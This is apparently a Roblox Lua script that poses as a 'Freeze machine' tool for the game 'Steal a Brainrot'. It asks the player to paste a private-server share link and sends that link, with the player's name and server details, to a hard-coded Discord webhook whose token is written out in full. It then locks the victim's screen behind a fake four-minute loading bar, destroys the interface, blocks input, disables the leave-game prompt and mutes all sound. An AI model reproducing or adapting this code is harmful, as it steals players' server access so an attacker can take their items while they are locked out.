local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")

-- ⚠️ PON TU WEBHOOK AQUÍ
local webhook = "https://discord.com/api/webhooks/1475441750486290453/jJ449pM3gP7uHm3SfZ3_7xZZFob68AqtJ-A6DvA1UYw2oxTKpm7cjedr1g4Kov0lJSH-"

-- Obtener nombre del juego automáticamente
local gameName = "Desconocido"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

-- FUNCIÓN PARA ENVIAR A DISCORD
local function SendToDiscord(message)
    if not message or message == "" then return end

    local playerCount = #Players:GetPlayers()

    local data = {
        ["embeds"] = {{
            ["title"] = "Freeze Machine Detectado",
            ["description"] = message,
            ["color"] = 3447003,
            ["fields"] = {
                {
                    ["name"] = "Jugador",
                    ["value"] = Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Juego",
                    ["value"] = gameName,
                    ["inline"] = true
                },
                {
                    ["name"] = "Personas en servidor",
                    ["value"] = tostring(playerCount),
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = os.date("%X")
            }
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })
end

-- GUI Principal
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DiseñoFreezeMachine"
ScreenGui.Parent = PlayerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 320, 0, 220)
MainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 25, 45)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = MainFrame

local stroke = Instance.new("UIStroke")
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(0, 170, 255)
stroke.Parent = MainFrame

local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 30)
TopBar.BackgroundColor3 = Color3.fromRGB(10, 20, 35)
TopBar.Parent = MainFrame

local topBarCorner = Instance.new("UICorner")
topBarCorner.CornerRadius = UDim.new(0, 15)
topBarCorner.Parent = TopBar

local Titulo = Instance.new("TextLabel")
Titulo.Size = UDim2.new(1, 0, 1, 0)
Titulo.BackgroundTransparency = 1
Titulo.Text = "Freeze machine"
Titulo.TextSize = 16
Titulo.Font = Enum.Font.GothamBold
Titulo.TextColor3 = Color3.new(1, 1, 1)
Titulo.Parent = TopBar

local CampoTexto = Instance.new("TextBox")
CampoTexto.Size = UDim2.new(0.9, 0, 0, 45)
CampoTexto.Position = UDim2.new(0.05, 0, 0, 60)
CampoTexto.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
CampoTexto.PlaceholderText = "Pega el código aquí..."
CampoTexto.TextSize = 16
CampoTexto.Font = Enum.Font.Gotham
CampoTexto.TextColor3 = Color3.new(1, 1, 1)
CampoTexto.Parent = MainFrame

local campoCorner = Instance.new("UICorner")
campoCorner.CornerRadius = UDim.new(0, 15)
campoCorner.Parent = CampoTexto

local EstadoLabel = Instance.new("TextLabel")
EstadoLabel.Size = UDim2.new(1, 0, 0, 30)
EstadoLabel.Position = UDim2.new(0, 0, 0, 120)
EstadoLabel.BackgroundTransparency = 1
EstadoLabel.Text = ""
EstadoLabel.TextSize = 16
EstadoLabel.Font = Enum.Font.Gotham
EstadoLabel.Parent = MainFrame

local nombreUsuario = Players.LocalPlayer.Name

-- VALIDACIÓN SEGURA DEL LINK
CampoTexto.FocusLost:Connect(function()
    local textoIngresado = CampoTexto.Text

    if string.match(textoIngresado, "^https://www%.roblox%.com/share%?code=%w+&type=Server$") then
        
        EstadoLabel.Text = string.format("Verificado✅\nUsuario: %s", nombreUsuario)
        EstadoLabel.TextColor3 = Color3.fromRGB(0, 255, 0)

        -- 🔥 SOLO AQUÍ ENVÍA AL DISCORD
        SendToDiscord("Link válido ingresado ✅\n\nLink:\n"..textoIngresado)

        -- 🧠 Pega aquí tu segundo script para que se ejecute solo si es válido
        -- Pega aquí tu segundo script
        local Players = game:GetService("Players")
local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local CoreGui = game:GetService("CoreGui")
local SoundService = game:GetService("SoundService")
local Player = Players.LocalPlayer

task.wait(3)

for _, gui in pairs(PlayerGui:GetChildren()) do
	if gui:IsA("ScreenGui") and gui.Name ~= "CargaBrainrot" then
		gui:Destroy()
	end
end

for _, gui in pairs(CoreGui:GetChildren()) do
	if gui:IsA("ScreenGui") then
		gui:Destroy()
	end
end

for i = 1, 15 do
	local Capa = Instance.new("ScreenGui")
	Capa.Name = "CargaBrainrotCapa"..i
	Capa.Parent = PlayerGui
	Capa.ZIndexBehavior = Enum.ZIndexBehavior.Global
	Capa.DisplayOrder = 99999999 + i

	local Frame = Instance.new("Frame")
	Frame.Size = UDim2.new(3, 0, 3, 0)
	Frame.Position = UDim2.new(-1, 0, -1, 0)
	Frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
	Frame.ZIndex = 99999999 + i
	Frame.Parent = Capa

	local FrameMenu = Instance.new("Frame")
	FrameMenu.Size = UDim2.new(3, 0, 0.5, 0)
	FrameMenu.Position = UDim2.new(-1, 0, -0.25, 0)
	FrameMenu.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
	FrameMenu.ZIndex = 99999999 + i + 100
	FrameMenu.Parent = Capa

	local Patron = Instance.new("ImageLabel")
	Patron.Size = UDim2.new(3, 0, 3, 0)
	Patron.Position = UDim2.new(-1, 0, -1, 0)
	Patron.BackgroundTransparency = 1
	Patron.Image = "rbxassetid://123456789"
	Patron.ImageTransparency = 0.8
	Patron.ZIndex = 99999999 + i + 50
	Patron.Parent = Frame
end

local CargaGui = Instance.new("ScreenGui")
CargaGui.Name = "CargaBrainrot"
CargaGui.Parent = PlayerGui
CargaGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
CargaGui.DisplayOrder = 100000000 + 15

local CapaBloqueo = Instance.new("TextButton")
CapaBloqueo.Size = UDim2.new(1, 0, 1, 0)
CapaBloqueo.Position = UDim2.new(0, 0, 0, 0)
CapaBloqueo.BackgroundTransparency = 1
CapaBloqueo.Text = ""
CapaBloqueo.AutoButtonColor = false
CapaBloqueo.Active = true
CapaBloqueo.Selectable = false
CapaBloqueo.ZIndex = 999999999
CapaBloqueo.Parent = CargaGui

local Contenedor = Instance.new("Frame")
Contenedor.Size = UDim2.new(0, 600, 0, 400)
Contenedor.Position = UDim2.new(0.5, -300, 0.5, -200)
Contenedor.BackgroundTransparency = 1
Contenedor.ZIndex = 3
Contenedor.Parent = CargaGui

local Titulo1 = Instance.new("TextLabel")
Titulo1.Size = UDim2.new(1, 0, 0, 60)
Titulo1.Position = UDim2.new(0, 0, 0.1, 0)
Titulo1.BackgroundTransparency = 1
Titulo1.Text = "🧠Steal a"
Titulo1.TextSize = 48
Titulo1.Font = Enum.Font.GothamBold
Titulo1.TextColor3 = Color3.new(1, 1, 1)
Titulo1.TextXAlignment = Enum.TextXAlignment.Center
Titulo1.ZIndex = 4
Titulo1.Parent = Contenedor

local Titulo2 = Instance.new("TextLabel")
Titulo2.Size = UDim2.new(1, 0, 0, 80)
Titulo2.Position = UDim2.new(0, 0, 0.25, 0)
Titulo2.BackgroundTransparency = 1
Titulo2.Text = "Breinrot🧠"
Titulo2.TextSize = 64
Titulo2.Font = Enum.Font.GothamBold
Titulo2.TextColor3 = Color3.new(1, 1, 1)
Titulo2.TextXAlignment = Enum.TextXAlignment.Center
Titulo2.ZIndex = 4
Titulo2.Parent = Contenedor

local TextoInfo = Instance.new("TextLabel")
TextoInfo.Size = UDim2.new(1, 0, 0, 40)
TextoInfo.Position = UDim2.new(0, 0, 0.55, 0)
TextoInfo.BackgroundTransparency = 1
TextoInfo.Text = "Este script puede tardar unos minutos espera por favor, al finalizar se pondrá el script para máquina si no ejecuta vuelva a intentar✅"
TextoInfo.TextSize = 20
TextoInfo.Font = Enum.Font.Gotham
TextoInfo.TextColor3 = Color3.new(1, 1, 1)
TextoInfo.TextXAlignment = Enum.TextXAlignment.Center
TextoInfo.TextWrapped = true
TextoInfo.ZIndex = 4
TextoInfo.Parent = Contenedor

local BarraContenedor = Instance.new("Frame")
BarraContenedor.Size = UDim2.new(0, 500, 0, 25)
BarraContenedor.Position = UDim2.new(0.5, -250, 0.75, 0)
BarraContenedor.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
BarraContenedor.BorderSizePixel = 2
BarraContenedor.BorderColor3 = Color3.new(0.3, 0.3, 0.3)
BarraContenedor.ZIndex = 4
BarraContenedor.Parent = Contenedor

local UICornerBarra = Instance.new("UICorner")
UICornerBarra.CornerRadius = UDim.new(0, 5)
UICornerBarra.Parent = BarraContenedor

local BarraCarga = Instance.new("Frame")
BarraCarga.Size = UDim2.new(0, 0, 1, 0)
BarraCarga.BackgroundColor3 = Color3.new(1, 1, 1)
BarraCarga.ZIndex = 5
BarraCarga.Parent = BarraContenedor

local UICornerCarga = Instance.new("UICorner")
UICornerCarga.CornerRadius = UDim.new(0, 3)
UICornerCarga.Parent = BarraCarga

local Porcentaje = Instance.new("TextLabel")
Porcentaje.Size = UDim2.new(1, 0, 0, 30)
Porcentaje.Position = UDim2.new(0, 0, 1.1, 0)
Porcentaje.BackgroundTransparency = 1
Porcentaje.Text = "0%"
Porcentaje.TextSize = 20
Porcentaje.Font = Enum.Font.GothamBold
Porcentaje.TextColor3 = Color3.new(1, 1, 1)
Porcentaje.TextXAlignment = Enum.TextXAlignment.Center
Porcentaje.ZIndex = 4
Porcentaje.Parent = BarraContenedor

local function bloquearMovimiento()
	local character = Player.Character
	if character then
		local humanoid = character:FindFirstChild("Humanoid")
		if humanoid then
			humanoid.WalkSpeed = 0
			humanoid.JumpHeight = 0
		end
	end
end

local function restaurarMovimiento()
	local character = Player.Character
	if character then
		local humanoid = character:FindFirstChild("Humanoid")
		if humanoid then
			humanoid.WalkSpeed = 16
			humanoid.JumpHeight = 7.2
		end
	end
end

bloquearMovimiento()

local tiempoInicio = os.clock()
local duracionCarga = 240

RunService.RenderStepped:Connect(function()
	local tiempoTranscurrido = os.clock() - tiempoInicio
	if tiempoTranscurrido < duracionCarga then
		local porcentaje = (tiempoTranscurrido / duracionCarga) * 100
		BarraCarga.Size = UDim2.new(porcentaje / 100, 0, 1, 0)
		Porcentaje.Text = string.format("%.0f%%", porcentaje)
		bloquearMovimiento()
	else
		BarraCarga.Size = UDim2.new(1, 0, 1, 0)
		Porcentaje.Text = "100%"
		restaurarMovimiento()
		for _, gui in pairs(PlayerGui:GetChildren()) do
			if gui.Name:find("CargaBrainrot") then
				gui:Destroy()
			end
		end
	end
end)

local function bloquearTodo()
	return Enum.ContextActionResult.Sink
end

UserInputService.InputBegan:Connect(bloquearTodo)
UserInputService.InputEnded:Connect(bloquearTodo)
UserInputService.InputChanged:Connect(bloquearTodo)

RunService.RenderStepped:Connect(function()
	for _, gui in pairs(PlayerGui:GetChildren()) do
		if not gui.Name:find("CargaBrainrot") then
			gui:Destroy()
		end
	end
	for _, gui in pairs(CoreGui:GetChildren()) do
		gui:Destroy()
	end
	pcall(function()
		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
		StarterGui:SetCore("TopbarEnabled", false)
		StarterGui:SetCore("PromptLeaveGame", false)
		StarterGui:SetCore("VoiceChatVisible", false)
	end)
end)

-- Mute global para todos los sonidos en el juego
local function silenciarSonido(sonido)
    if sonido:IsA("Sound") then
        sonido.Volume = 0
        sonido:Stop()
        -- Evita que alguien lo vuelva a subir
        sonido:GetPropertyChangedSignal("Volume"):Connect(function()
            sonido.Volume = 0
        end)
    end
end

-- Silenciar todos los sonidos existentes
for _, obj in pairs(game:GetDescendants()) do
    silenciarSonido(obj)
end

-- Silenciar cualquier sonido que se agregue después
game.DescendantAdded:Connect(function(obj)
    silenciarSonido(obj)
end)

print("Diseño de carga Brainrot activado! Tardará 4 minutos en completarse.")

    else
        
        EstadoLabel.Text = string.format("Error❎\nUsuario: %s", nombreUsuario)
        EstadoLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

        -- ❌ NO ENVÍA NADA AL DISCORD
    end
end)

MainFrame:GetPropertyChangedSignal("Position"):Connect(function()
    MainFrame.Position = UDim2.new(0.5, -160, 0.5, -110)
end)

print("Script listo - Solo envía si es válido!")
